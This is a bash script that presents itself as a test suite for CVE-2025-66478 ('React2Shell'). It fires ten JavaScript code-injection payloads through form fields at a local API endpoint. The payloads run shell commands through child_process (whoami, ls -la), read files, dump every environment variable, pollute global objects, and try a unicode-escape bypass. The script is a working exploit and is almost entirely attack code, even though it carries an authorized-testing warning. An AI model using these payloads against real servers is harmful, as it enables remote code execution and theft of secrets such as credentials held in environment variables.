#!/bin/bash

# React2Shell Vulnerability Test - Form-based RCE
# Test script for CVE-2025-66478
# WARNING: For testing purposes only on authorized systems!

BASE_URL="http://localhost:3000"

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}React2Shell - Form RCE Test Suite${NC}"
echo -e "${BLUE}========================================${NC}\n"

# Test 1: Basic Form Injection
echo -e "${YELLOW}[TEST 1] Basic Form Injection${NC}"
curl -s -X POST "${BASE_URL}/api/vulnerable-submit" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Test User",
    "message": "Normal message"
  }' | jq '.'
echo -e "${GREEN}✓ Normal submission completed${NC}\n"

# Test 2: Code Execution via Message Field
echo -e "${YELLOW}[TEST 2] Code Execution via Message Field${NC}"
PAYLOAD="'); require('child_process').exec('whoami', (e,o) => console.log('USER:', o)); //"
echo "Payload: $PAYLOAD"
curl -s -X POST "${BASE_URL}/api/vulnerable-submit" \
  -H "Content-Type: application/json" \
  -d "{
    \"name\": \"Attacker\",
    \"message\": \"${PAYLOAD}\"
  }" | jq '.'
echo -e "${GREEN}✓ Malicious payload delivered${NC}\n"

# Test 3: File System Access
echo -e "${YELLOW}[TEST 3] File System Read via Form${NC}"
PAYLOAD="'); const fs=require('fs'); console.log(fs.readFileSync('./package.json','utf8')); //"
echo "Payload: $PAYLOAD"
curl -s -X POST "${BASE_URL}/api/vulnerable-submit" \
  -H "Content-Type: application/json" \
  -d "{
    \"name\": \"Attacker\",
    \"message\": \"${PAYLOAD}\"
  }" | jq '.'
echo -e "${GREEN}✓ File read attempt completed${NC}\n"

# Test 4: Environment Variable Leak
echo -e "${YELLOW}[TEST 4] Environment Variable Leak${NC}"
PAYLOAD="'); console.log('ENV:', JSON.stringify(process.env)); //"
echo "Payload: $PAYLOAD"
curl -s -X POST "${BASE_URL}/api/vulnerable-submit" \
  -H "Content-Type: application/json" \
  -d "{
    \"name\": \"Attacker\",
    \"message\": \"${PAYLOAD}\"
  }" | jq '.'
echo -e "${GREEN}✓ Environment leak attempt completed${NC}\n"

# Test 5: Global Object Pollution
echo -e "${YELLOW}[TEST 5] Global Object Pollution${NC}"
PAYLOAD="'); global.compromised = true; global.attackerData = {stolen: 'data'}; //"
echo "Payload: $PAYLOAD"
curl -s -X POST "${BASE_URL}/api/vulnerable-submit" \
  -H "Content-Type: application/json" \
  -d "{
    \"name\": \"Attacker\",
    \"message\": \"${PAYLOAD}\"
  }" | jq '.'
echo -e "${GREEN}✓ Global pollution completed${NC}\n"

# Test 6: Process Information Disclosure
echo -e "${YELLOW}[TEST 6] Process Information Disclosure${NC}"
PAYLOAD="'); console.log('PID:', process.pid, 'CWD:', process.cwd(), 'ARGS:', process.argv); //"
echo "Payload: $PAYLOAD"
curl -s -X POST "${BASE_URL}/api/vulnerable-submit" \
  -H "Content-Type: application/json" \
  -d "{
    \"name\": \"Attacker\",
    \"message\": \"${PAYLOAD}\"
  }" | jq '.'
echo -e "${GREEN}✓ Process info disclosure completed${NC}\n"

# Test 7: Malicious Module Loading
echo -e "${YELLOW}[TEST 7] Malicious Module Loading${NC}"
PAYLOAD="'); try{const net=require('net'); console.log('NET MODULE LOADED');}catch(e){console.log('BLOCKED');} //"
echo "Payload: $PAYLOAD"
curl -s -X POST "${BASE_URL}/api/vulnerable-submit" \
  -H "Content-Type: application/json" \
  -d "{
    \"name\": \"Attacker\",
    \"message\": \"${PAYLOAD}\"
  }" | jq '.'
echo -e "${GREEN}✓ Module loading test completed${NC}\n"

# Test 8: Name Field Exploitation
echo -e "${YELLOW}[TEST 8] Name Field Exploitation${NC}"
PAYLOAD="'); console.log('PWNED VIA NAME FIELD'); //"
echo "Payload in name field: $PAYLOAD"
curl -s -X POST "${BASE_URL}/api/vulnerable-submit" \
  -H "Content-Type: application/json" \
  -d "{
    \"name\": \"${PAYLOAD}\",
    \"message\": \"Normal message\"
  }" | jq '.'
echo -e "${GREEN}✓ Name field exploit completed${NC}\n"

# Test 9: Multi-line Injection
echo -e "${YELLOW}[TEST 9] Multi-line Injection${NC}"
PAYLOAD="');\nrequire('child_process').exec('ls -la', (e,o) => console.log(o));\nconsole.log('"
echo "Payload: $PAYLOAD"
curl -s -X POST "${BASE_URL}/api/vulnerable-submit" \
  -H "Content-Type: application/json" \
  -d "{
    \"name\": \"Attacker\",
    \"message\": \"${PAYLOAD}\"
  }" | jq '.'
echo -e "${GREEN}✓ Multi-line injection completed${NC}\n"

# Test 10: Unicode Bypass Attempt
echo -e "${YELLOW}[TEST 10] Unicode Bypass Attempt${NC}"
PAYLOAD="\\u0027); require(\\u0027child_process\\u0027).exec(\\u0027whoami\\u0027); //"
echo "Payload: $PAYLOAD"
curl -s -X POST "${BASE_URL}/api/vulnerable-submit" \
  -H "Content-Type: application/json" \
  -d "{
    \"name\": \"Attacker\",
    \"message\": \"${PAYLOAD}\"
  }" | jq '.'
echo -e "${GREEN}✓ Unicode bypass attempt completed${NC}\n"

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}Form RCE Test Suite Completed${NC}"
echo -e "${BLUE}========================================${NC}"
echo -e "\n${YELLOW}Check server console for execution results${NC}"
echo -e "${RED}⚠️  If any code was executed, the API is VULNERABLE${NC}\n"
